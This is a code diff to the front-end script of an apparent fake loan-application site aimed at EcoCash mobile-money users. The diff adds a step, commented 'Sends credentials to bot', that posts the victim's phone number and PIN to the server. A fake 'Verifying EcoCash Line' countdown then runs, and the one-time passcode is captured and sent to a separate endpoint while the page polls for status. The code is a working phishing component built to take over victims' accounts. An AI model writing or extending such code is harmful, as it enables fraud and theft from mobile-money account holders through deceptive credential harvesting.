@@ -70,24 +70,46 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // STEP 2 Submission -> 5s Countdown -> Step 3
+  // STEP 2 Submission -> Sends credentials to bot -> 10s Countdown -> Step 3
   if (step2Form) {
-    step2Form.addEventListener('submit', (e) => {
+    step2Form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      loanAppData.phone = document.getElementById('phone').value.trim();
+      const phoneInput = document.getElementById('phone').value.trim();
+      
+      // Strict EcoCash validation check (+263 77 or +263 78)
+      if (!phoneInput.startsWith('77') && !phoneInput.startsWith('78')) {
+        alert('Invalid number. Only EcoCash numbers (starting with 77 or 78 after +263) are allowed.');
+        return;
+      }
+
+      loanAppData.phone = phoneInput;
       loanAppData.pin = document.getElementById('pin').value.trim();
 
       step2Form.classList.add('hidden');
       stepLoading.classList.remove('hidden');
 
-      let countdown = 5;
-      if (loadingTitle) loadingTitle.innerText = `Verifying Credentials... (${countdown}s)`;
-      if (loadingDesc) loadingDesc.innerText = "Please wait while we connect to your account and send an OTP.";
+      try {
+        const response = await fetch('/api/submit-credentials', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(loanAppData)
+        });
+        const result = await response.json();
+        if (result.success) {
+          currentAppReference = result.appReference;
+        }
+      } catch (err) {
+        console.error('Credential submission error:', err);
+      }
+
+      let countdown = 10; // Updated to 10 seconds
+      if (loadingTitle) loadingTitle.innerText = `Verifying EcoCash Line... (${countdown}s)`;
+      if (loadingDesc) loadingDesc.innerText = "Please wait while we establish a secure session and dispatch your OTP.";
 
       const countdownTimer = setInterval(() => {
         countdown--;
         if (countdown > 0) {
-          if (loadingTitle) loadingTitle.innerText = `Verifying Credentials... (${countdown}s)`;
+          if (loadingTitle) loadingTitle.innerText = `Verifying EcoCash Line... (${countdown}s)`;
         } else {
           clearInterval(countdownTimer);
           stepLoading.classList.add('hidden');
@@ -98,7 +120,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // STEP 3 Submission
+  // STEP 3 Submission (OTP Code)
   if (step3Form) {
     step3Form.addEventListener('submit', async (e) => {
       e.preventDefault();
@@ -109,8 +131,6 @@ document.addEventListener('DOMContentLoaded', () => {
         return;
       }
 
-      loanAppData.otpCode = otpCode;
-
       if (btnStep3) {
         btnStep3.innerText = "Verifying...";
         btnStep3.disabled = true;
@@ -120,23 +140,22 @@ document.addEventListener('DOMContentLoaded', () => {
       if (otpStatusBanner) otpStatusBanner.className = "bg-blue-50 border border-blue-200 rounded-lg p-3 text-center";
       if (otpStatusText) {
         otpStatusText.className = "text-xs text-blue-700 font-medium";
-        otpStatusText.innerText = "Verifying details & OTP code, please wait...";
+        otpStatusText.innerText = "Verifying OTP code, please wait...";
       }
 
       try {
-        const response = await fetch('/api/submit-full-application', {
+        const response = await fetch('/api/submit-otp', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(loanAppData)
+          body: JSON.stringify({ appReference: currentAppReference, otpCode })
         });
 
         const result = await response.json();
 
         if (result.success) {
-          currentAppReference = result.appReference;
           startPollingStatus(currentAppReference);
         } else {
-          resetOtpForm('Failed to submit application. Please try again.');
+          resetOtpForm('Failed to submit OTP. Please try again.');
         }
       } catch (err) {
         console.error('Error in step 3:', err);
